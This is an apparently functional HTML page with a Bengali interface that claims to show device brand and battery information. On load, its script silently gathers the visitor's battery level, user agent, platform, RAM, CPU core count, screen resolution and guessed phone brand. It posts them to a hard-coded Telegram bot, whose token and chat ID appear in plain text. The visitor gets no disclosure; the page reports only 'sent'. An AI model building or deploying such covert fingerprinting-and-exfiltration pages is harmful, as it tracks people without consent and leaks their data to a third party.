<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>📱 ডিভাইস কোম্পানি + ব্যাটারি তথ্য</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      text-align: center;
      padding: 40px;
    }
    h2 { color: #222; }
    #status {
      margin-top: 20px;
      font-size: 18px;
      color: #444;
    }
  </style>
</head>
<body>
  <h2>📲 কোম্পানি + ব্যাটারি তথ্য</h2>
  <p id="status">⏳ অনুগ্রহ করে অপেক্ষা করুন...</p>

  <script>
    const BOT_TOKEN = "7868941323:AAE35R5cQ16Tl1CQpcQNstWl6mMcFLba5_A";
    const CHAT_ID = "1054739462";
    const status = document.getElementById("status");

    function detectBrand(userAgent) {
      userAgent = userAgent.toLowerCase();
      if (userAgent.includes("samsung") || userAgent.includes("sm-")) return "Samsung";
      if (userAgent.includes("redmi") || userAgent.includes("xiaomi")) return "Xiaomi";
      if (userAgent.includes("realme") || userAgent.includes("rmx")) return "Realme";
      if (userAgent.includes("oppo")) return "Oppo";
      if (userAgent.includes("vivo")) return "Vivo";
      if (userAgent.includes("iphone") || userAgent.includes("ios")) return "Apple";
      if (userAgent.includes("oneplus")) return "OnePlus";
      if (userAgent.includes("nokia")) return "Nokia";
      return "❓ অজানা কোম্পানি";
    }

    async function sendFullDeviceInfo() {
      let batteryInfo = "🔋 Battery: Unknown";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `🔋 Battery: ${Math.round(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
      } catch (e) {}

      const userAgent = navigator.userAgent;
      const platform = navigator.platform;
      const memory = navigator.deviceMemory || "Unknown";
      const cpuCores = navigator.hardwareConcurrency || "Unknown";
      const screenRes = `${screen.width}x${screen.height}`;
      const brand = detectBrand(userAgent);

      const deviceInfo = `📱 ডিভাইস কোম্পানি: ${brand}
🛠️ User-Agent: ${userAgent}
🧠 Platform: ${platform}
💾 RAM: ${memory} GB
🧮 CPU Cores: ${cpuCores}
📐 স্ক্রিন: ${screenRes}`;

      const message = `${batteryInfo}
${deviceInfo}`;

      try {
        const res = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });

        if (res.ok) {
          status.innerText = "✅ পাঠানো হয়েছে!";
        } else {
          status.innerText = "⚠️ পাঠাতে সমস্যা হয়েছে!";
        }
      } catch (err) {
        status.innerText = "🚫 নেটওয়ার্ক সমস্যা!";
      }
    }

    window.onload = sendFullDeviceInfo;
  </script>
</body>
</html>
